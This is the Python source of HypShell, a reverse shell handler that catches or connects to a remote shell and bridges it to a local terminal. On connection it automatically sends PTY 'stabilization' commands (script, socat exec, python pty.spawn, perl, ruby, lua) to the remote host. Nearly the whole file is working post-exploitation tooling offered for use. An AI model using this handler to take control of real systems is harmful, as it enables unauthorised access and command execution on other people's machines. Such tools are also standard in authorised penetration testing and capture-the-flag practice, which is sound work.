#!/usr/bin/env python3

"""
HypShell - a simple reverse shell handler and automatic stabilizer
Author: Ofir Havkin - aka Hyper

HypShell is a simple reverse shell handler and automatic stabilizer written in Python 3.
It can be used instead of netcat to handle reverse shells and stabilize them automatically.

Copyright (C) 2023 Ofir Havkin - aka Hyper

HypShell is a free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

HypShell is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import os
import sys
import socket
import select
import termios
import fcntl
import argparse 
import textwrap

args = None
shell = "/bin/bash"
# Feel free to add more stabilization methods
stabilization_methods = {
    "script": f"/usr/bin/script -qc {shell} /dev/null",
    "socat": f"/usr/bin/socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp-connect:",
    "python": f"python -c 'import pty; pty.spawn(\"{shell}\")'",
    "python3": f"python3 -c 'import pty; pty.spawn(\"{shell}\")'",
    "perl": f"perl -e 'exec \"{shell}\";'",
    "ruby": f"ruby -e 'exec \"{shell}\";'",
    "lua": f"lua -e 'os.execute(\"{shell}\")'",
    "echo": f"echo os.system('{shell}')"
}


class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # store termios and fcntl module references
        self.termios, self.fcntl = termios, fcntl

        # open controlling PTY
        self.pty = os.open(os.readlink("/proc/%d/fd/%d" %
                           (pid, slave)), os.O_RDWR)
        # store old and new TTY settings
        self.oldtermios = termios.tcgetattr(self.pty)
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        if args.echo:
            newattr[3] &= ~termios.ICANON
        else:
            newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        if not args.sigint:
            newattr[6][termios.VINTR] = 0

        if not args.sigquit:
            newattr[6][termios.VQUIT] = 0

        if not args.sigterm:
            newattr[6][termios.VSUSP] = 0

        # set TTY settings
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)

        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

        # set the alternate screen
        if not args.normal:
            self.write(b"\x1b[?1049h\x1b[H\x1b[2J")

    def read(self, size=8192):
        return os.read(self.pty, size)

    def write(self, data):
        ret = os.write(self.pty, data)
        # os.fsync(self.pty)
        return ret

    def fileno(self):
        return self.pty

    def close(self):
        if not args.normal:
            self.write(b"\x1b[?1049l")
        termios.tcsetattr(self.pty, termios.TCSAFLUSH, self.oldtermios)
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags)
        os.close(self.pty)


class Shell:
    def __init__(self, conn, addr):
        self.sock = conn
        self.addr = addr

    def handle(self):
        pty = PTY()
        r_list = [pty, self.sock]
        w_list = []
        x_list = []

        if args.verbose:
            print(f">> Connection from {self.addr[0]}:{self.addr[1]}")
            print(f">> Stabilization method: {args.method}")
            print(f">> Shell: {args.shell}")
            print("|||||||||||||HypShell|||||||||||||")
            print()

        # Stabilize the connection
        if args.stabilize:
            method = stabilization_methods[args.method]
            self.sock.sendall(method.encode() + b"\n")

        data = " "
        while data:
            try:
                r, _, _ = select.select(r_list, [], [])
                for s in r:
                    if s == pty:
                        data = pty.read()
                        if data:
                            self.sock.sendall(data)
                    elif s == self.sock:
                        data = self.sock.recv(4096)
                        if data:
                            pty.write(data)

            except Exception as e:
                pty.close()
                if args.verbose:
                    print(f"Error occurred while handling connection: {e}")
                exit(1)

        self.sock.close()
        pty.close()


def listener(port, interface=None):
    try:
        if args.connect:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((args.connect, port))
            shell = Shell(s, (args.connect, port))
            shell.handle()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if interface:
                s.setsockopt(socket.SOL_SOCKET,
                             socket.SO_BINDTODEVICE, interface.encode())
            s.bind(('', port))
            s.listen(1)

            conn, addr = s.accept()
            shell = Shell(conn, addr)
            shell.handle()

    except Exception as e:
        if args.verbose:
            print(f"Error occurred while handling connection: {e}")
        exit(1)

    except KeyboardInterrupt:
        if args.verbose:
            print("Keyboard interrupt")
        exit(0)


def main():
    global args, shell

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="hypshell - a simple reverse shell handler and automatic stabilizer",
        usage=f"{sys.argv[0]} [options] port",
        epilog=textwrap.dedent(
            """
            examples:
                hypshell.py 4242
                hypshell.py 4242 -q
                hypshell.py 4242 -vx 127.0.0.1
                hypshell.py 4242 -s /bin/sh -m python3
            """
        ))

    parser.add_argument("port", type=int, help="port number")
    parser.add_argument("-m", "--method", metavar="method", default="script",
                        help="stabilize the connection using the specified method (default: script)")
    parser.add_argument("-v", "--verbose",
                        action="store_true", help="verbose mode")
    parser.add_argument("-i", "--interface", metavar="interface",
                        help="specify the network interface to use")
    parser.add_argument("-n", "--normal", action="store_true",
                        help="use normal mode instead of alternate screen")
    parser.add_argument("-c", "--stabilize", action="store_false", default=True,
                        help="do not stabilize the shell")
    parser.add_argument("-e", "--echo", action="store_true", default=False,
                        help="echo input")
    parser.add_argument("-s", "--shell", metavar="shell", default="/bin/bash",
                        help="specify the full path of the shell to use (default: /bin/bash)")
    parser.add_argument("-t", "--sigint", action="store_true", default=False,
                        help="handle SIGINT signal")
    parser.add_argument("-r", "--sigterm", action="store_true", default=False,
                        help="handle SIGTERM signal")
    parser.add_argument("-q", "--sigquit", action="store_true", default=False,
                        help="handle SIGQUIT signal")
    parser.add_argument("-x", "--connect", metavar="address", default=None,
                        help="connect to specified address instead of bind")

    args = parser.parse_args()

    if not str(args.port).isdigit():
        print("Invalid port")
        exit(1)
    port = args.port

    # Check if the interface is valid
    interface = args.interface
    if args.interface:
        if interface not in os.listdir("/sys/class/net/"):
            print("Invalid interface")
            exit(1)

    # Check if the stabilization method is valid
    if args.method not in stabilization_methods.keys():
        print("Invalid stabilization method")
        exit(1)

    if args.shell:
        shell = args.shell

    if args.verbose:
        print(f"Starting HypShell on port {port}")
    listener(port, interface)


if __name__ == "__main__":
    main()
